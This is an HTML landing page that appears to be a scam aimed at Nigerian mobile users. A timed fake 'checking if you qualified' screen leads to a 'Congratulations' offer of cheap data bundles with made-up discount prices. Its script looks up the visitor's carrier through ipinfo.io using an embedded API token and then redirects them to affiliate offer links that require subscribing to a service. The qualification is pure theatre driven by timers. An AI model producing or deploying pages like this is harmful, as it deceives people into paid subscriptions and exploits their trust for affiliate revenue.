<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script src="https://cdn.tailwindcss.com"></script>

<style>
  body {
    font-family: Inter, system-ui, -apple-system, BlinkMacSystemFont;
    background: linear-gradient(180deg, #f8fafc 0%, #e2e8f0 100%);
  }
  .soft-card {
    background: linear-gradient(135deg, #ffffff 0%, #f1f5f9 100%);
  }
  .loader {
    border: 6px solid rgba(59,130,246,0.2);
    border-top: 6px solid #2563eb;
    border-radius: 50%;
    width: 64px;
    height: 64px;
    animation: spin 1s linear infinite;
  }
  @keyframes spin {
    100% { transform: rotate(360deg); }
  }
</style>
</head>

<body class="min-h-screen flex items-center justify-center px-4">

<div class="fixed inset-0 bg-black/10 pointer-events-none"></div>

<div id="processBox" class="relative z-10 soft-card rounded-2xl shadow-xl p-8 max-w-md w-full text-center">
  <h1 id="processText" class="text-xl font-extrabold text-blue-600 mb-6">
    Processing… Please wait
  </h1>
  <div class="loader mx-auto mb-6"></div>
  <p class="text-gray-600 text-sm">
    Please do not refresh this page
  </p>
</div>

<div id="congratsBox" class="relative z-10 hidden soft-card rounded-2xl shadow-xl p-8 max-w-md w-full text-center">
  <h1 class="text-2xl font-extrabold text-green-600 mb-2">
    🎉 Congratulations!
  </h1>

  <p class="text-gray-600 mb-4">
    You qualified for the data below:
  </p>

  <div id="bundleText" class="text-3xl font-black text-blue-600 mb-2">
    5GB DATA
  </div>

  <div id="priceText" class="mb-6">
    ₦100 ONLY
  </div>

  <div class="bg-blue-50 border border-blue-200 rounded-xl p-4 text-sm text-left mb-20">
    <p>To Receive Data - Enter your number and Subscribe to any of our service on the next page when you click the button below.</p>
  </div>

  <button class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 rounded-xl shadow-lg transition">
    Subscribe to Receive Data
  </button>
</div>

<script>
  const params = new URLSearchParams(window.location.search);
  const bundle = params.get("bundle") || "5GB";

  setTimeout(() => {
    document.getElementById("processText").innerText =
      "Checking if you qualified…";
  }, 4000);

  setTimeout(() => {
    document.getElementById("processBox").classList.add("hidden");
    document.getElementById("congratsBox").classList.remove("hidden");

    document.getElementById("bundleText").innerText =
      bundle + " DATA";

    const priceBox = document.getElementById("priceText");

    if (bundle === "20GB") {
      priceBox.innerHTML = `
        <div class="text-gray-400 line-through text-lg">₦200</div>
        <div class="bg-green-100 text-green-700 px-4 py-2 rounded-full font-bold mt-1 inline-block">
          ₦100 ONLY
        </div>
      `;
    } 
    else if (bundle === "10GB") {
      priceBox.innerHTML = `
        <div class="text-gray-400 line-through text-lg">₦150</div>
        <div class="bg-green-100 text-green-700 px-4 py-2 rounded-full font-bold mt-1 inline-block">
          ₦100 ONLY
        </div>
      `;
    } 
    else {
      priceBox.innerHTML = `
        <div class="bg-green-100 text-green-700 px-4 py-2 rounded-full font-bold inline-block">
          ₦100 ONLY
        </div>
      `;
    }

  }, 5000);
</script>

<script>
function detectNetwork() {
  fetch("https://ipinfo.io/json?token=55355b912bdc12")
    .then(res => res.json())
    .then(data => {
      const network = data.org ? data.org.toLowerCase() : "";

      if (network.includes("mtn")) {
        window.location.href = "https://www.orientationdisk.wiki/click?offer_id=34962&pub_id=269631&pub_click_id=ADD_CLICK_ID_HERE&site=PASS_SITE_HERE";
      } else if (network.includes("airtel")) {
        window.location.href = "https://covwyxqac.one/cl/67a9642f26918e02";
      } else {
        window.location.href = "https://covwyxqac.one/cl/67a9642f26918e02";
      }
    })
    .catch(() => {
      window.location.href = "https://covwyxqac.one/cl/67a9642f26918e02";
    });
}

document.addEventListener("DOMContentLoaded", function() {
  const btn = document.querySelector('#congratsBox button');
  if (!btn) return;

  btn.addEventListener('click', function() {
    btn.disabled = true;

    btn.innerHTML = `
      <svg class="animate-spin inline-block w-5 h-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
        <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
        <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8v4a4 4 0 00-4 4H4z"></path>
      </svg>
    `;

    setTimeout(() => {
      detectNetwork();
    }, 2000);
  });
});
</script>

</body>
</html>
